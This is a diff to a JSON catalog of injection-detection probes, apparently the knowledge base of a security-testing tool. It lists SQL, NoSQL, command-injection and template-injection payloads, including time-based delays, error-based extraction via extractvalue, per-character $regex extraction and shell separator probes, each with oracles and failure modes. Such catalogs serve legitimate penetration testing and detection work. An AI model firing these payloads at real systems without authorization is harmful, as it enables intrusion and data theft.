@@ -2,7 +2,7 @@
   "corpus": "INJ",
   "organ": "injection-lab",
   "vuln_class": "injection_detection",
-  "corpus_version": "1.1.0",
+  "corpus_version": "1.2.0",
   "house_rules": [
     "Entries are DETECTION ORACLES first: each one exists to produce a measurable differential (response class, content, or timing), not to dump data.",
     "Payloads are canonical forms from the public record, attributed per entry; backend grammar details come from the cheat-sheet source, not memory.",
@@ -13,7 +13,9 @@
     {
       "id": "INJ-001",
       "technique": "boolean-based differential oracle",
-      "prerequisites": ["injectable boolean position in a WHERE/HAVING clause"],
+      "prerequisites": [
+        "injectable boolean position in a WHERE/HAVING clause"
+      ],
       "probe": "' AND 1=1-- (treatment) / ' AND 1=2-- (control)",
       "oracle": "tautology returns the normal result set, contradiction returns empty/different - the PAIR is the oracle; one response alone proves nothing",
       "failure_modes": [
@@ -30,7 +32,9 @@
     {
       "id": "INJ-002",
       "technique": "UNION column-count enumeration via ORDER BY",
-      "prerequisites": ["injectable ORDER BY or SELECT-list position"],
+      "prerequisites": [
+        "injectable ORDER BY or SELECT-list position"
+      ],
       "probe": "' ORDER BY 1-- then increment the ordinal until error (n+1 = column count)",
       "oracle": "error appears exactly when the ordinal exceeds the real column count",
       "failure_modes": [
@@ -46,7 +50,9 @@
     {
       "id": "INJ-003",
       "technique": "UNION type reconciliation via NULL padding",
-      "prerequisites": ["known column count (INJ-002)"],
+      "prerequisites": [
+        "known column count (INJ-002)"
+      ],
       "probe": "' UNION SELECT NULL,NULL,NULL-- (one NULL per column, then replace one at a time with typed values)",
       "oracle": "query succeeds with all-NULL; a non-NULLable/typed column error at a specific position maps the column types",
       "failure_modes": [
@@ -62,7 +68,10 @@
     {
       "id": "INJ-004",
       "technique": "MySQL time-based oracle (SLEEP)",
-      "prerequisites": ["injectable boolean position", "stacked queries NOT required"],
+      "prerequisites": [
+        "injectable boolean position",
+        "stacked queries NOT required"
+      ],
       "probe": "' AND SLEEP(5)-- / ' AND IF(1=1,SLEEP(5),0)--",
       "oracle": "response time inflates by the sleep window on the tautology branch only; run n>=3 with baseline - single slow response is noise, not an oracle",
       "failure_modes": [
@@ -80,7 +89,10 @@
     {
       "id": "INJ-005",
       "technique": "MySQL time-based oracle (BENCHMARK, filter-evasive)",
-      "prerequisites": ["same as INJ-004", "SLEEP filtered or absent"],
+      "prerequisites": [
+        "same as INJ-004",
+        "SLEEP filtered or absent"
+      ],
       "probe": "' AND BENCHMARK(5000000,SHA1('test'))--",
       "oracle": "CPU-bound hashing loop inflates response time proportionally to the iteration count",
       "failure_modes": [
@@ -96,7 +108,9 @@
     {
       "id": "INJ-006",
       "technique": "PostgreSQL time-based oracle (pg_sleep)",
-      "prerequisites": ["PostgreSQL backend (error grammar fingerprint first)"],
+      "prerequisites": [
+        "PostgreSQL backend (error grammar fingerprint first)"
+      ],
       "probe": "' AND (SELECT 1 FROM pg_sleep(5))--",
       "oracle": "scalar subquery over pg_sleep blocks the row evaluation for the window",
       "failure_modes": [
@@ -112,7 +126,10 @@
     {
       "id": "INJ-007",
       "technique": "SQL Server time-based oracle (WAITFOR DELAY)",
-      "prerequisites": ["SQL Server backend", "STACKED QUERIES available in the injection point"],
+      "prerequisites": [
+        "SQL Server backend",
+        "STACKED QUERIES available in the injection point"
+      ],
       "probe": "'; WAITFOR DELAY '0:0:5'--",
       "oracle": "second statement blocks the batch for the window; requires the driver to send multi-statement batches",
       "failure_modes": [
@@ -128,7 +145,10 @@
     {
       "id": "INJ-008",
       "technique": "Oracle time-based oracle (heavy Cartesian count)",
-      "prerequisites": ["Oracle backend", "no WAITFOR/pg_sleep equivalent in reach"],
+      "prerequisites": [
+        "Oracle backend",
+        "no WAITFOR/pg_sleep equivalent in reach"
+      ],
       "probe": "' AND 1=(SELECT COUNT(*) FROM all_users a, all_users b, all_users c)--",
       "oracle": "cartesian product size inflates evaluation time; tune the join count for a measurable-but-bounded window",
       "failure_modes": [
@@ -144,7 +164,10 @@
     {
       "id": "INJ-009",
       "technique": "MySQL error-based extraction oracle",
-      "prerequisites": ["MySQL >= 5.1 (XPath functions present)", "verbose errors surfaced to the response"],
+      "prerequisites": [
+        "MySQL >= 5.1 (XPath functions present)",
+        "verbose errors surfaced to the response"
+      ],
       "probe": "' AND extractvalue(1,concat(0x7e,version()))-- / ' AND updatexml(1,concat(0x7e,version()),1)--",
       "oracle": "the XPath argument error echoes the concatenated expression value in the SQL error - version() is the calibration proof; arbitrary expressions follow the same channel",
       "failure_modes": [
@@ -160,7 +183,9 @@
     {
       "id": "INJ-010",
       "technique": "comment terminator grammar per backend",
-      "prerequisites": ["fingerprinted or candidate backend"],
+      "prerequisites": [
+        "fingerprinted or candidate backend"
+      ],
       "probe": "-- (MySQL/Postgres/SQL Server, with trailing space) / # (MySQL) / /* ... */ (all, mid-statement)",
       "oracle": "which terminator restores a valid query (200/normal class) fingerprints the backend family - a FACT record, not a finding",
       "failure_modes": [
@@ -176,7 +201,10 @@
     {
       "id": "INJ-011",
       "technique": "NoSQL operator-injection boolean oracle (MongoDB $ne)",
-      "prerequisites": ["JSON-shaped or query-string-parseable parameter reaching a document query", "MongoDB-class backend (operator grammar is per-database)"],
+      "prerequisites": [
+        "JSON-shaped or query-string-parseable parameter reaching a document query",
+        "MongoDB-class backend (operator grammar is per-database)"
+      ],
       "probe": "{\"username\":{\"$ne\":\"invalid\"}} (treatment) / {\"username\":{\"$eq\":\"invalid\"}} (control)",
       "oracle": "the $ne tautology returns a document where the $eq control returns none - the PAIR is the oracle, the same discipline as INJ-001 with operator grammar instead of SQL boolean",
       "failure_modes": [
@@ -193,7 +221,9 @@
     {
       "id": "INJ-012",
       "technique": "NoSQL $regex truth-probing oracle",
-      "prerequisites": ["a document field whose $regex match flips an observable (row present, response class)"],
+      "prerequisites": [
+        "a document field whose $regex match flips an observable (row present, response class)"
+      ],
       "probe": "{\"password\":{\"$regex\":\"^a\"}} (treatment) / anchored non-matching class as control",
       "oracle": "per-position match/no-match deltas recover data one character at a time - the organ's bounded-extraction law applies (Phase 4 only, budget table shown)",
       "failure_modes": [
@@ -210,7 +240,9 @@
     {
       "id": "INJ-013",
       "technique": "NoSQL $where JavaScript timing oracle",
-      "prerequisites": ["MongoDB-class backend with server-side JavaScript enabled in the query context ($where)"],
+      "prerequisites": [
+        "MongoDB-class backend with server-side JavaScript enabled in the query context ($where)"
+      ],
       "probe": "{\"$where\":\"sleep(5000)\"} (treatment) / {\"$where\":\"1==1\"} (control)",
       "oracle": "response time inflates by the sleep window on the treatment branch only; conditional variants gate the delay on data (if(<condition>){sleep(...)}) over the same channel - timing floors apply (5 timed pairs, interleaved controls, delta > 2x control spread)",
       "failure_modes": [
@@ -227,7 +259,9 @@
     {
       "id": "INJ-014",
       "technique": "command-injection separator grammar (canary echo)",
-      "prerequisites": ["user input reaching an OS command line by concatenation or interpolation"],
+      "prerequisites": [
+        "user input reaching an OS command line by concatenation or interpolation"
+      ],
       "probe": "; echo MYTHOS-CANARY-<uuid> (treatment, one separator per probe: ; | && newline %0a) / echo MYTHOS-CANARY-<uuid> as inert trailing text (control)",
       "oracle": "the marker arrives through the execution channel only (response echo, written artifact, or operator collector callback) - the control's identical inert text proves the channel is execution, not reflection",
       "failure_modes": [
@@ -244,7 +278,9 @@
     {
       "id": "INJ-015",
       "technique": "template-injection detection family (per-engine evaluation probes)",
-      "prerequisites": ["user input rendered through a template engine (server-side or client-side)"],
+      "prerequisites": [
+        "user input rendered through a template engine (server-side or client-side)"
+      ],
       "probe": "${7*7} / {{7*7}} / <%= 7*7 %> / #{7*7} (one per probe, engine family unknown)",
       "oracle": "the evaluated artifact (49) appears in the response - evaluation, not reflection; control: the same expression wrapped so the engine treats it as literal (comment or string context)",
       "failure_modes": [
@@ -256,6 +292,27 @@
         "credit": "canonical detection payloads (per-engine evaluation probes); pair discipline per the organ's oracle catalog",
         "title": "PortSwigger Research - Server-Side Template Injection (detection payloads)",
         "url": "https://portswigger.net/research/server-side-template-injection"
+      }
+    },
+    {
+      "id": "INJ-016",
+      "technique": "time-based blind boolean differential (MSSQL stacked WAITFOR)",
+      "prerequisites": [
+        "injectable position in the last statement of a T-SQL batch",
+        "driver allows stacked queries (most SQL Server client libraries do)"
+      ],
+      "probe": "' IF 1=1 WAITFOR DELAY '0:0:5'-- (treatment) / ' IF 1=0 WAITFOR DELAY '0:0:5'-- (control)",
+      "oracle": "the PAIR is the oracle: the treatment arm delays about five seconds while the control arm returns immediately - the delay difference proves the injected branch executes. One delayed response alone proves nothing (load, timeouts, retries can all delay a response).",
+      "failure_modes": [
+        "WAITFOR is a statement, not a function: it cannot appear inside a SELECT or WHERE clause - the probe must end the original statement and start a new one (in a numeric context drop the leading quote)",
+        "the driver rejects stacked queries - no delay on either arm, the class is dead for that injection point",
+        "server load slows both arms - widen the gap (raise the delay) before reading the oracle",
+        "the injection point is not the last statement of the batch - the stacked arm never runs"
+      ],
+      "source": {
+        "credit": "transcribed from the MSSQL timing knowledge base; pair discipline per the organ's differential oracle doctrine (treatment vs control, one response proves nothing)",
+        "title": "websec.ca SQL Injection Knowledge Base - MSSQL / Timing",
+        "url": "https://websec.ca/sql-injection-knowledge-base/mssql/timing"
       }
     }
   ]
